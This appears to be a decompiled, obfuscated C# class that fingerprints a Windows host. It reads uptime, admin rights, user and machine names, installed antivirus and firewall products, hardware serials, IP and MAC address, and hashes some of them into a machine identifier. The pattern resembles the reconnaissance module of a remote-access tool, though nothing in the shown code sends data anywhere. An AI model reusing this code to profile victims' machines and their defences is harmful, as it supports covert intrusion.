using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Principal;

namespace GDBD.Importers
{
	internal sealed class GlobalIssuerImporter
	{
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private static string m_PublisherEvent;

		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		public static string _0001()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return m_PublisherEvent;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		[CompilerGenerated]
		private static void _0001(string setup)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			m_PublisherEvent = setup;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static GlobalIssuerImporter()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			_0001(ClassEvent.RegisterFilter(StartList() + GetList() + CalculateList()));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ComputeList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							DateTime d = ManagementDateTimeConverter.ToDateTime(managementObject["LastBootUpTime"].ToString());
							TimeSpan timeSpan = TimeSpan.FromTicks((DateTime.Now - d).Ticks);
							text = $"{timeSpan.Days}d : {timeSpan.Hours}h : {timeSpan.Minutes}m : {timeSpan.Seconds}s";
						}
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					throw new Exception("Getting uptime failed");
				}
				return text;
			}
			catch (Exception)
			{
				return $"{0}d : {0}h : {0}m : {0}s";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static bool DestroyList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return true;
			}
			return false;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string SetList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return Environment.MachineName;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string RateList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
			{
				if (registryKey == null || registryKey.GetValue("Release") == null)
				{
					return ".NET Framework Version 4.X is not detected.";
				}
				if ((int)registryKey.GetValue("Release") >= 528040)
				{
					return "4.8+";
				}
				if ((int)registryKey.GetValue("Release") >= 461808)
				{
					return "4.7.2";
				}
				if ((int)registryKey.GetValue("Release") >= 461308)
				{
					return "4.7.1";
				}
				if ((int)registryKey.GetValue("Release") >= 460798)
				{
					return "4.7";
				}
				if ((int)registryKey.GetValue("Release") >= 394802)
				{
					return "4.6.2";
				}
				if ((int)registryKey.GetValue("Release") >= 394254)
				{
					return "4.6.1";
				}
				if ((int)registryKey.GetValue("Release") >= 393295)
				{
					return "4.6";
				}
				if ((int)registryKey.GetValue("Release") >= 379893)
				{
					return "4.5.2";
				}
				if ((int)registryKey.GetValue("Release") >= 378675)
				{
					return "4.5.1";
				}
				if ((int)registryKey.GetValue("Release") >= 378389)
				{
					return "4.5";
				}
			}
			return Environment.MachineName;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string RemoveList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return Environment.UserName;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string PostList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string scope = ObserverEvent.AddList() ? "root\\SecurityCenter2" : "root\\SecurityCenter";
				string queryString = "SELECT * FROM AntivirusProduct";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["displayName"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ChangeList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string scope = ObserverEvent.AddList() ? "root\\SecurityCenter2" : "root\\SecurityCenter";
				string queryString = "SELECT * FROM FirewallProduct";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["displayName"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string CalculateList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string queryString = "SELECT * FROM Win32_BIOS";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["Manufacturer"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
			}
			return "Unknown";
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string GetList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string queryString = "SELECT * FROM Win32_BaseBoard";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["Manufacturer"].ToString() + managementObject["SerialNumber"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
			}
			return "Unknown";
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string StartList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string queryString = "SELECT * FROM Win32_Processor";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["Name"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
			}
			return "Unknown";
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static int ListList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				int result = 0;
				string queryString = "Select * From Win32_ComputerSystem";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							double num = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
							result = (int)(num / 1048576.0);
						}
					}
				}
				return result;
			}
			catch
			{
				return -1;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string SelectList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				string text = string.Empty;
				string queryString = "SELECT * FROM Win32_DisplayConfiguration";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
							text = managementObject["Description"].ToString();
						}
					}
				}
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string DeleteList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				GatewayIPAddressInformation gatewayIPAddressInformation = networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault();
				if (gatewayIPAddressInformation != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)))
				{
					foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
					{
						if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != uint.MaxValue)
						{
							return unicastAddress.Address.ToString();
						}
					}
				}
			}
			return "-";
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string TestList()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
				{
					bool flag = false;
					foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
					{
						if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != uint.MaxValue)
						{
							flag = (unicastAddress.Address.ToString() == DeleteList());
						}
					}
					if (flag)
					{
						return networkInterface.GetPhysicalAddress().ToString();
					}
				}
			}
			return "-";
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public GlobalIssuerImporter()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
	}
}
